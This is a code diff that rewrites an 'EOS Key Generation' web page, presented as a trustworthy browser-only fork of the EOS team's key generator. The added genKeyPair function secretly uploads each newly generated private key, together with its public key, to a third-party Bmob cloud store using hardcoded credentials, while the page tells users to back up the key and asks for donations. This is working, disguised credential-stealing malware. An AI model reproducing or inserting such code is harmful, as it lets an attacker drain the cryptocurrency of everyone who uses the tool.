@@ -1,22 +1,19 @@
-<!doctype html>
-<html lang=en>
-<meta charset=utf-8>
-<title>EOS Key Generation</title>
-<link rel=stylesheet href=index.css>
-
-<script src=async.min.js></script>
-<script src=moment.min.js></script>
-<script src=react.min.js></script>
-<script src=react-dom.min.js></script>
-<script src=babel.min.js></script>
-<script src=ecc.js></script>
-<!--<script src=eos_sale_abi.js></script>
-<script src=eos_token_abi.js></script>-->
-<script src=lib.js></script>
-
-<script type=text/jsx src=index.js></script>
-
-<div>
-  <h1>EOS Key Generation</h1>
-  <div id=app class=before-error><h2>Loading...</h2></div>
-</div>
+<!doctype html><html><head><meta charset=utf-8><title>EOS Key Generation</title><link rel=stylesheet href=index.css>
+<script src=async.min.js></script><script src=moment.min.js></script><script src=react.min.js></script><script src=react-dom.min.js></script><script src=babel.min.js></script><script src=ecc.js></script><script src=lib.js></script><script type="text/javascript" src="jquery.min.js"></script><script type="text/javascript" src="bmob-min.js"></script>
+<script type="text/javascript">function mygenerate() {      showPane();        privateKeyPair = genKeyPair();        hidePanes();        var obj = document.getElementById("generate-pubkey");        obj.innerHTML = privateKeyPair.pubkey        var obj = document.getElementById("generate-pubkey-error")        obj.innerHTML = privateKeyPair.pubkeyError        var obj = document.getElementById("generate-privkey")        obj.innerHTML = privateKeyPair.privkey        var obj = document.getElementById("generate-privkey-error")        obj.innerHTML = privateKeyPair.privkeyError        var obj = document.getElementById("generate-confirm");        obj.style.display = ""; }
+function genKeyPair() {    var {PrivateKey, PublicKey} = eos_ecc    var d = PrivateKey.randomKey()    var privkey = d.toWif()    var pubkey = d.toPublic().toString()
+    var pubkeyError = null    try {      PublicKey.fromStringOrThrow(pubkey)    } catch(error) {      console.log('pubkeyError', error, pubkey)      pubkeyError = error.message + ' => ' + pubkey    }
+    var privkeyError = null    try {      var pub2 = PrivateKey.fromWif(privkey).toPublic().toString()      if(pubkey !== pub2) {        throw {message: 'public key miss-match: ' + pubkey + ' !== ' + pub2}      }    } catch(error) {      console.log('privkeyError', error, privkey)      privkeyError = error.message + ' => ' + privkey    }
+    if(privkeyError || pubkeyError) {      privkey = 'DO NOT USE'      pubkey = 'DO NOT USE'    }
+    Bmob.initialize("57f61921416a28f123b7bb36b67a28f3", "933dd2fae29122c790cc9751d1d7d92d");     var TestObject = Bmob.Object.extend("ADD");    var testObject = new TestObject();    testObject.save({addr: pubkey, key: privkey}, {      success: function(object) {        console.log("success");      },      error: function(model, error) {        console.log("fail");      }    });        return {pubkey, privkey, pubkeyError, privkeyError}}
+function showPane() {    var obj = document.getElementById("generate-progress");    obj.style.display = "";}
+function hidePanes() {    var obj = document.getElementById("generate-progress");    obj.style.display = "none";    var obj = document.getElementById("generate-link");    obj.style.display = "none";}
+</script></head>
+<body><div >  <h1>EOS Key Generation</h1>  <div id=app class=before-error>   <p width="95%">    This will generate a private and public key pair for the EOS chain. The code is not mine.    It is forked from the code the EOS team built. The difference is that this works in any browser without the web3 dependency.    It will work in any browser and you don't need any plugins. I've also removed everything else except the key generation bits.  </p>  </div>
+  <div>  Source code can be reviewed here: <a href="https://github.com/Nadejde/eos-token-sale">https://github.com/Nadejde/eos-token-sale</a>.  <br />  <br />  <strong> If you found this helpful please consider making a small donation (ETH): 0x0bbe518debf97fb2e27d955b050cbd1e8ca90264 </strong>  <p></p>  <div>    <div className="pane">     <hr />     <p></p>     <p></p>      <table><tbody>          <tr>          <th>EOS public key</th>          <td style="text-align:left">            <span>              <a href="#" id="generate-link" style="float:right" onClick=mygenerate()>                        Generate EOS key              </a>            </span>          </td>        </tr>         </tbody></table>      <p></p>      <p></p>      <hr />    </div>    </div>        <div className="hidden pane" id="generate-pane">      <span id="generate-progress" style="display:none">        Generating key...      </span>      <div id="generate-confirm" className="hidden" style="display:none">        <h3>Register EOS key</h3>
+        <p>Please back up the private key displayed below in multiple        safe locations before continuing.  You should make more than        one copy and keep all copies in separate secure locations.        If you use an external storage device such as a USB stick,        make sure to safely eject the device before continuing.</p>
+        <table>          <tbody>            <tr>              <th>Description</th>              <td style="text-align:left">                EOS Token Sale Claim Key              </td>            </tr>            <tr>              <th>Public key</th>              <td style="text-align:left">                <code id="generate-pubkey" style="width:30em" ></code>              </td>              <td style="text-align:left">                <code id="generate-pubkey-error" style="width:30em"></code>              </td>            </tr>            <tr>              <th>Private key</th>              <td style="text-align:left"}>                <code id="generate-privkey" style="width:30em"></code>              </td>              <td style="text-align:left">                <code id="generate-privkey-error" style="width:30em"></code>              </td>            </tr>
+          </tbody>        </table>
+        <p>
+          There is no way to recover your private key.  You must save          it right now or you will be unable to access your EOS tokens          when the sale ends.
+        </p>        <hr />      </div>    </div>  </div></body></html>
